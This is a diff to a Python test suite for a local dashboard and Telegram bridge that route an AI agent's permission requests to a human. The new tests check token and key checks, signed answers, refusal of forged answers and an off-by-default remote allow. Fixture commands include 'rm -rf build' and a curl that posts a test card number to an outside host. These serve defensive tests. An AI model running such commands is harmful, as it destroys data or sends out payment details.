@@ -333,7 +333,7 @@ def projects_server():
         try:
             def get(path):
                 c = http.client.HTTPConnection("127.0.0.1", server.server_port, timeout=10)
-                c.request("GET", path, headers={"Host": "localhost"})
+                c.request("GET", path, headers={"Host": "localhost", "X-Kit-Token": "t" * 24})
                 r = c.getresponse()
                 return r.status, r.read().decode()
             code, body = get("/api/tasks")
@@ -574,6 +574,19 @@ def hook(root, payload, *args, env=None, script=None, raw=None):
     return p.returncode, p.stdout, p.stderr, time.monotonic() - t
 
 
+def flow_module():
+    import importlib.util
+    spec = importlib.util.spec_from_file_location("kit_flow_for_tests", HOOK)
+    m = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(m)
+    return m
+
+
+def signed(obj):
+    """An answer as the dashboard writes it: signed with the key under $FORECREW_HOME/private."""
+    return flow_module().sign_answer(obj)
+
+
 def kit_root():
     root = tempfile.mkdtemp()
     os.makedirs(os.path.join(root, ".claude"))
@@ -799,9 +812,9 @@ def attention_hooks():
                 proc.wait()
                 raise AssertionError(f"the hold did not end within {limit}s: it ignored its exit condition")
             return proc.returncode, proc.stdout.read()
-        def put(name, obj):
+        def put(name, obj, sign=True):
             tmp = os.path.join(att, "s1", ".tmp-test")
-            open(tmp, "w").write(json.dumps(obj))
+            open(tmp, "w").write(json.dumps(signed(obj) if sign else obj))
             os.replace(tmp, os.path.join(att, "s1", name))
 
         proc, a = held()
@@ -831,6 +844,18 @@ def attention_hooks():
             put("main.answer.json", {"qid": a["qid"], **bad})
             code, out = finish(proc)
             assert out == "" and load("s1")["held"] is False, f"{label}: the hold must not take it"
+
+        # An answer any process of the project could write (right qid, tagged web, no signature
+        # or a wrong one) is not the dev's either: the hold acts only on the dashboard's signature.
+        good = {"via": "web", "answers": [{"options": [0]}, {"options": [0]}]}
+        for label, forged in (("unsigned", lambda q: {"qid": q, **good}),
+                              ("bad signature", lambda q: {"qid": q, **good, "sig": "0" * 64}),
+                              ("signature of another answer", lambda q: {**signed({"qid": q, **good}),
+                                                                         "answers": [{"options": [1]}, {"options": [1]}]})):
+            proc, a = held()
+            put("main.answer.json", forged(a["qid"]), sign=False)
+            code, out = finish(proc)
+            assert out == "" and load("s1")["held"] is False, f"{label}: a forged answer must go to the terminal"
 
         proc, a = held()
         open(os.path.join(att, "s1", "main.release"), "w").close()
@@ -985,8 +1010,8 @@ def attention_server():
         assert held["main"]["held"] is False, "a holder without a heartbeat is not holding"
         put(other_wt, "s1", "main", q())
 
-        token = "tok-" + "x" * 20
-        handler = type("H", (d.Handler,), {"root": main_wt, "token": token})
+        token, key = "tok-" + "x" * 20, "key-" + "k" * 20
+        handler = type("H", (d.Handler,), {"root": main_wt, "token": token, "page_key": key})
         server = d.http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
         threading.Thread(target=server.serve_forever, daemon=True).start()
         port = server.server_port
@@ -1011,14 +1036,25 @@ def attention_server():
                 r = c.getresponse()
                 return r.status, r.read()
 
-            code, page = call("GET", "/")
+            code, page = call("GET", f"/?k={key}")
             assert code == 200 and token.encode() in page and b"__KIT_TOKEN__" not in page, "the page must carry the token"
+            # Without the link's key, any local process could read the page and its token, then
+            # answer what a hook holds: the page needs the key, and every read the token.
+            for path in ("/", "/index.html", "/?k=wrong", f"/?k={key}x"):
+                code, page = call("GET", path, headers={"X-Kit-Token": None})
+                assert code == 403 and token.encode() not in page, f"GET {path} without the key: {code}"
+            for path in ("/api/attention", "/api/tasks", "/api/worktrees", "/api/projects", "/flow.json", "/api/events"):
+                for h in ({"X-Kit-Token": None}, {"X-Kit-Token": "nope"}):
+                    assert call("GET", path, headers=h)[0] == 403, f"GET {path} without the token must be refused"
+            assert call("GET", "/api/ping", headers={"X-Kit-Token": None}) == (200, b'{"forecrew": true}'), \
+                "work.sh ui start finds a running server through /api/ping, with no token"
             c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
-            c.request("GET", "/", headers={"Host": f"127.0.0.1:{port}"})
+            c.request("GET", f"/?k={key}", headers={"Host": f"127.0.0.1:{port}"})
             r = c.getresponse()
             r.read()
             assert r.getheader("X-Frame-Options") == "DENY" and \
                 r.getheader("Content-Security-Policy") == "frame-ancestors 'none'", "the page must refuse to be framed"
+            assert r.getheader("Referrer-Policy") == "no-referrer", "a link the page opens must not receive its key"
             # The page's own strings and wiring are checked in test_page.py (wiring()).
             code, body = call("GET", "/api/attention")
             assert code == 200 and token.encode() not in body, "the token must not be in /api/attention"
@@ -1083,6 +1119,7 @@ def attention_server():
             assert call("POST", "/api/answer", good)[0] == 200
             written = json.load(open(os.path.join(sdir, "main.answer.json")))
             assert written["qid"] == "QID" and written["via"] == "web", "the server must tag what it writes"
+            assert flow_module().answer_signed(written), "the server must sign what it writes"
             os.remove(os.path.join(sdir, "main.answer.json"))
             assert call("POST", "/api/answer", {k: v for k, v in good.items() if k != "answers"} | {"release": True})[0] == 200
             assert os.path.exists(os.path.join(sdir, "main.release"))
@@ -1791,7 +1828,7 @@ def closing_mr():
             try:
                 def get(path):
                     c = http.client.HTTPConnection("127.0.0.1", server.server_port, timeout=5)
-                    c.request("GET", path, headers={"Host": "127.0.0.1"})
+                    c.request("GET", path, headers={"Host": "127.0.0.1", "X-Kit-Token": "page-token"})
                     r = c.getresponse()
                     return r.status, r.read()
                 wt_feat = next(g["wt"] for g in d.list_tasks(repo) if g["branch"] == "feat/t-2-x")
@@ -2694,9 +2731,11 @@ def event_stream():
                 head = read_until(c, b"\r\n\r\n", 3)
                 c.close()
                 assert head.startswith(b"HTTP/1.0 403"), f"{label}: {head[:60]}"
+            # Any local process can send a localhost Origin: without the token it is refused too.
             c = open_stream(path="/api/events", origin=f"http://127.0.0.1:{port}")
-            assert b"event: hello" in read_until(c, b"event: hello", 3), "a localhost Origin opens the stream"
+            head = read_until(c, b"\r\n\r\n", 3)
             c.close()
+            assert head.startswith(b"HTTP/1.0 403"), f"a localhost Origin without the token: {head[:60]}"
             time.sleep(0.3)
 
             d._last_visible[0] = time.time() + 600  # a page in view (page_visibility tests the rule)
@@ -3046,6 +3085,28 @@ def page_holds():
             return out
 
         perm = {"hook_event_name": "PermissionRequest", "session_id": "p1", "tool_name": "Bash", "tool_input": {"command": "rm -rf build"}}
+        F = flow_module()
+        flag = os.path.join(F.private_dir(), F.REMOTE_ALLOW)
+        # Allow from the page is off by default: the alert is raised, not held, so the terminal
+        # dialog shows at once, and the server refuses an allow even for a held alert.
+        assert not F.remote_allow_on(), "precondition: allow from the page off"
+        open(page, "w").close()
+        t0 = time.monotonic()
+        p = subprocess.run([sys.executable, ATTN, "permission"], input=json.dumps(perm), capture_output=True, text=True, env=env)
+        a = json.load(open(os.path.join(adir, "p1", "main.json")))
+        assert p.stdout == "" and time.monotonic() - t0 < 5 and a["held"] is False and a["kind"] == "permission", \
+            "allow off: a permission must not be held"
+        a = {**a, "held": True, "heartbeat": time.time()}
+        open(os.path.join(adir, "p1", "main.json"), "w").write(json.dumps(a))
+        code, why = d.answer(root, {"wt": 0, "session": "p1", "agent": "main", "qid": a["qid"], "behavior": "allow"})
+        assert code == 403 and "allow on" in why and not os.path.exists(os.path.join(adir, "p1", "main.answer.json")), \
+            "allow off: the server must refuse an allow"
+        assert d.answer(root, {"wt": 0, "session": "p1", "agent": "main", "qid": a["qid"], "behavior": "deny"})[0] == 200
+        shutil.rmtree(os.path.join(adir, "p1"))
+        # `work.sh ui allow on` writes its flag under $FORECREW_HOME/private, out of the project.
+        p = subprocess.run([sys.executable, HOOK, "remote-allow", "on"], capture_output=True, text=True, env=env)
+        assert p.stdout.strip() == "on" and os.path.isfile(flag) and F.remote_allow_on()
+        assert os.stat(F.private_dir()).st_mode & 0o777 == 0o700, "the private directory is 0700"
         for behavior in ("allow", "deny"):
             proc, a = start("permission", perm)
             assert a["kind"] == "permission" and "rm -rf build" in a["detail"], a
@@ -3059,6 +3120,13 @@ def page_holds():
         proc, a = start("permission", perm)
         assert d.answer(root, {"wt": 0, "session": "p1", "agent": "main", "qid": a["qid"], "release": True})[0] == 200
         assert finish(proc) == "", "a released permission prints no decision"
+        # A signed allow taken back by `allow off` before the hook reads it is not acted on.
+        proc, a = start("permission", perm)
+        assert d.answer(root, {"wt": 0, "session": "p1", "agent": "main", "qid": a["qid"], "behavior": "allow"})[0] == 200
+        os.remove(flag)
+        assert finish(proc) == "", "allow turned off: the terminal decides"
+        p = subprocess.run([sys.executable, HOOK, "remote-allow"], capture_output=True, text=True, env=env)
+        assert p.stdout.strip() == "off"
 
         stop = {"hook_event_name": "Stop", "session_id": "t1", "last_assistant_message": "Contract written. Go on?"}
         t0 = time.monotonic()
@@ -3255,6 +3323,15 @@ def telegram_bridge():
 
         perm = {"hook_event_name": "PermissionRequest", "session_id": "p1", "tool_name": "Bash",
                 "tool_input": {"command": "curl -d card=4111111111111111 https://x"}}
+        # Allow off (the default): the permission reaches the phone as an alert, with no button.
+        p = subprocess.run([sys.executable, ATTN, "permission"], input=json.dumps(perm), capture_output=True, text=True, env=env)
+        assert p.stdout == "", "allow off: not held, the terminal decides"
+        until(lambda: any("Bash" in p["text"] for p in fake.sent("sendMessage")), "the permission reaches Telegram")
+        msg = fake.sent("sendMessage")[-1]
+        assert "Answer in the terminal" in msg["text"] and not (msg.get("reply_markup") or {}).get("inline_keyboard"), msg
+        shutil.rmtree(os.path.join(adir, "p1"))
+        b.scan()
+        subprocess.run([sys.executable, HOOK, "remote-allow", "on"], capture_output=True, check=True, env=env)
         proc = subprocess.Popen([sys.executable, ATTN, "permission"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE, text=True, env=env)
         proc.stdin.write(json.dumps(perm))
@@ -3342,6 +3419,7 @@ def telegram_bridge():
         except tg.TelegramError as e:
             assert "SECRET" not in str(e) and "502" in str(e), str(e)
     finally:
+        subprocess.run([sys.executable, HOOK, "remote-allow", "off"], capture_output=True)
         fake.server.shutdown()
         shutil.rmtree(root)
 
